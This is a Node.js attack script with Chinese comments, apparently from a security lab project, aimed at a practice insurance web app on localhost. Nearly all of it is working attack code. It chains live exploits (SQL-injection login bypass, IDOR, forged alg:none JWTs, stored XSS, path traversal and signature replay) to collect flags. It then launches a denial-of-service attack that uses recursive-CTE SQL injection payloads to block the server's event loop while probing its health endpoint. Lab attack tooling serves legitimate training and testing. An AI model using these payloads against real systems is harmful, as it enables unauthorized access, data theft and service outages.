/* Aegis 神盾 · 真实攻击编排器（打靶机 insure-target）
 * ------------------------------------------------------------
 * 全部为真实 HTTP 请求，不做任何模拟：
 *   阶段一 漏洞利用链（取证用，拿 flag）
 *   阶段二 真实致瘫：SQL 注入 → node:sqlite 同步执行 → 靶机事件循环阻塞 → /api/health 无响应
 *
 * 用法：
 *   node scripts/real-attack.js               # 只跑漏洞链（不打断服务）
 *   node scripts/real-attack.js --dos 20      # 漏洞链 + 20s 致瘫
 *   node scripts/real-attack.js --dos-only 25 # 只致瘫
 */
'use strict';
const http = require('http');

const TARGET = process.env.TARGET || 'http://127.0.0.1:8899';
const { hostname, port } = new URL(TARGET);

function req(method, path, body, headers = {}, timeout = 15000) {
  return new Promise((res) => {
    const isJson = body && typeof body === 'object';
    const payload = isJson ? JSON.stringify(body) : (body || '');
    const h = { ...(isJson ? { 'content-type': 'application/json' } : {}), ...headers };
    if (payload) h['content-length'] = Buffer.byteLength(payload);
    const r = http.request({ host: hostname, port: port || 80, path, method, headers: h, timeout }, (x) => {
      let b = ''; x.on('data', (d) => { b += d; });
      x.on('end', () => {
        let j = null; try { j = JSON.parse(b); } catch (e) { }
        res({ code: x.statusCode, raw: b, json: j });
      });
    });
    r.on('error', (e) => res({ code: 0, raw: String(e.message), json: null }));
    r.on('timeout', () => { r.destroy(); res({ code: -1, raw: 'timeout', json: null }); });
    if (payload) r.write(payload);
    r.end();
  });
}

const b64u = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
const log = [];
function rec(name, ok, detail, flag) {
  log.push({ name, ok, detail, flag });
  console.log(`  ${ok ? '✓' : '✗'} ${name.padEnd(24)} ${detail}${flag ? '  → ' + flag : ''}`);
}

/* ── 阶段一：漏洞利用链 ── */
async function exploitChains() {
  console.log('── 阶段一 · 漏洞利用链（真实 HTTP）──');

  // 1. SQL 注入绕过登录
  const r1 = await req('POST', '/api/login', { email: "admin@insure.local' -- ", password: 'x' });
  const adminTok = r1.json && r1.json.token;
  rec('SQL 注入登录绕过', !!(r1.json && r1.json.user && r1.json.user.role === 'admin'),
    `role=${r1.json && r1.json.user && r1.json.user.role}`, r1.json && r1.json.flag);

  // 2. IDOR 越权读他人保单
  const r2 = await req('GET', '/api/policy/1003', null, { authorization: 'Bearer ' + adminTok });
  rec('IDOR 越权读保单', !!(r2.json && r2.json.flag), `保单 1003 · ${r2.json && r2.json.policy && r2.json.policy.product}`, r2.json && r2.json.flag);

  // 3. JWT alg:none 伪造管理员
  const forged = `${b64u({ alg: 'none', typ: 'JWT' })}.${b64u({ uid: 1, role: 'admin', name: 'x' })}.`;
  const r3 = await req('GET', '/api/admin/flag', null, { authorization: 'Bearer ' + forged });
  rec('JWT alg:none 伪造', !!(r3.json && r3.json.flag), r3.json && r3.json.secrets, r3.json && r3.json.flag);

  // 4. 存储型 XSS：提交含脚本的理赔 → 管理员机器人巡视触发
  const r4a = await req('POST', '/api/claim', { policy_id: 1001, amount: 999, description: '<img src=x onerror=alert(1)>' }, { authorization: 'Bearer ' + adminTok });
  const cid = r4a.json && r4a.json.id;
  const r4b = await req('GET', `/api/bot/visit?claim=${cid}`);
  rec('存储型 XSS（管理员机器人）', !!(r4b.json && r4b.json.triggered), `理赔 #${cid}`, r4b.json && r4b.json.flag);

  // 5. 路径穿越读服务端任意文件
  const r5 = await req('GET', '/download?file=' + encodeURIComponent('../../flags/web_path_traversal.txt'));
  const flag5 = (r5.raw || '').match(/FLAG\{[^}]+\}/);
  rec('路径穿越读任意文件', !!flag5, `读到 ${(r5.raw || '').trim().slice(0, 40)}`, flag5 && flag5[0]);

  // 6. 盲签名：接口暴露危险载荷
  const r6 = await req('GET', '/api/verify/blind');
  rec('盲签名（eth_sign）', !!(r6.json && r6.json.dangerousPayload), r6.json && r6.json.hint, r6.json && r6.json.flag);

  // 7. 签名重放：同一签名提交两次仍被接受
  const sig = '0x' + 'ab'.repeat(65);
  await req('POST', '/api/verify/sign', { message: 'approve', signature: sig, address: '0xA11CE00000000000000000000000000000000002' });
  const r7 = await req('POST', '/api/verify/sign', { message: 'approve', signature: sig, address: '0xA11CE00000000000000000000000000000000002' });
  rec('签名重放（permit）', !!(r7.json && r7.json.replayed), `第二次 accepted=${r7.json && r7.json.accepted}`, r7.json && r7.json.flag);

  return log;
}

/* ── 阶段二：真实致瘫 ── */
async function dos(seconds) {
  console.log(`\n── 阶段二 · 真实致瘫攻击（SQL 注入 → 事件循环阻塞 ${seconds}s）──`);
  const N = Number(process.env.DOS_N || 60000000);       // 单轮 ≈15s（实测 200 万 ≈ 0.48s）
  const rounds = Math.max(1, Math.round(seconds / 15));

  const before = await req('GET', '/api/health', null, {}, 3000);
  console.log(`  攻击前 /api/health → ${before.code} ${before.json ? 'ok=' + before.json.ok : before.raw}`);

  const t0 = Date.now();
  let downConfirmed = 0, downChecks = 0;
  const monitor = setInterval(async () => {
    const r = await req('GET', '/api/health', null, {}, 1200);
    downChecks++;
    if (r.code !== 200 || !r.json || !r.json.ok) downConfirmed++;
  }, 1500);

  /* 并发注入：请求在靶机事件循环里串行排队，因此并发可消除轮次之间的间隙，
     形成「持续阻塞」而非「脉冲式阻塞」，使监控侧判定为一次连续宕机事故。 */
  const shots = [];
  for (let i = 0; i < rounds; i++) {
    const email = `x' UNION ALL SELECT (SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<${N}) SELECT x FROM c)), 2,3,4 -- `;
    shots.push(req('POST', '/api/login', { email, password: 'x' }, {}, 300000));
  }
  await Promise.all(shots);
  clearInterval(monitor);
  const dur = ((Date.now() - t0) / 1000).toFixed(1);

  const after = await req('GET', '/api/health', null, {}, 5000);
  console.log(`  攻击结束，耗时 ${dur}s；期间探测 ${downChecks} 次，其中 ${downConfirmed} 次无响应`);
  console.log(`  攻击后 /api/health → ${after.code} ${after.json ? 'ok=' + after.json.ok : after.raw}`);
  return { seconds: +dur, rounds, downChecks, downConfirmed, recovered: !!(after.json && after.json.ok) };
}

(async () => {
  const arg = process.argv.slice(2);
  const dosIdx = arg.indexOf('--dos');
  const dosOnly = arg.includes('--dos-only');
  const sec = dosIdx >= 0 ? Number(arg[dosIdx + 1] || 20) : Number(arg[1] || 25);

  console.log(`靶机：${TARGET}\n`);
  if (!dosOnly) {
    const chains = await exploitChains();
    const got = chains.filter(c => c.flag).length;
    console.log(`\n  漏洞链 ${chains.filter(c => c.ok).length}/${chains.length} 成功 · 取得 flag ${got} 个`);
  }
  if (dosIdx >= 0 || dosOnly) {
    const d = await dos(sec);
    console.log(`\n  致瘫结果：${d.downConfirmed}/${d.downChecks} 次探测无响应 · 已恢复=${d.recovered}`);
  }
})();
